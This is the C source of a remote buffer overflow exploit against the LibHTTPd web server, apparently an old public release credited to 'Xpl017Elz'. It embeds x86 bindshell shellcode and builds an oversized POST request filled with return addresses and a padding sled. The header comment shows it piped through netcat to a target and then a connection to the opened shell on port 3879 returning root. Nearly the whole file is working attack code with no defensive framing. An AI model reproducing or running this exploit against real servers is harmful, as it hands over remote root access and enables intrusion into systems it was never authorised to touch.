/*
**
** Lib HTTPd Remote Buffer Overflow exploit
**                             by Xpl017Elz
** __
** Testing exploit:
**
** bash$ (./0x82-Remote.libhttpdxpl;cat)|nc libhttphost 80
**
** (Ctrl+c)
** punt!
** bash$ nc libhttphost 3879
** uname
** Linux
** id
** uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),
** 3(sys),4(adm),6(disk),10(wheel)
** exit
** bash$
**
** --
** exploit by "you dong-hun"(Xpl017Elz), <szoahc@hotmail.com>.
** My World: http://x82.i21c.net
**
*/

#include <stdio.h>
int main(/* args? */)
{
    int shadd2r;
    char b1ndsh[] = /* 129byte bindshellcode */
        "\211\3451\322\262f\211\3201\311\211\313C\211]\370C\211]\364K\211M\374\215M"
        "\364\315\2001\311\211E\364Cf\211]\354f\307E\356\017'\211M\360\215E\354\211E"
        "\370\306E\374\020\211\320\215M\364\315\200\211\320CC\315\200\211\320C\315"
        "\200\211\3031\311\262?\211\320\315\200\211\320A\315\200\353\030^\211u"
        "\b1\300\210F\007\211E\f\260\013\211\363\215M\b\215U\f\315\200\350\343\377"
        "\377\377/bin/sh";
    //--- POST &shellcode ---//
    fprintf(stdout,"POST ");
    for(shadd2r=0;shadd2r<0x408;shadd2r+=4)
    {/* rEDhAT Default: 0x804e482,
        Debian Address? */
        fprintf(stdout,"\202\344\004\b");
    }
    fprintf(stdout,"\r\n");
    //--- NOP,shellcode ---//
    for(shadd2r=0;shadd2r<0x3e8;shadd2r++)
    {/* SSSSSSSS...SSSSSSSSS;;; */
        fprintf(stdout,"S");
    }
    fprintf(stdout,"%s\r\nx0x\r\nx82\r\nl0l\r\n",b1ndsh);
}

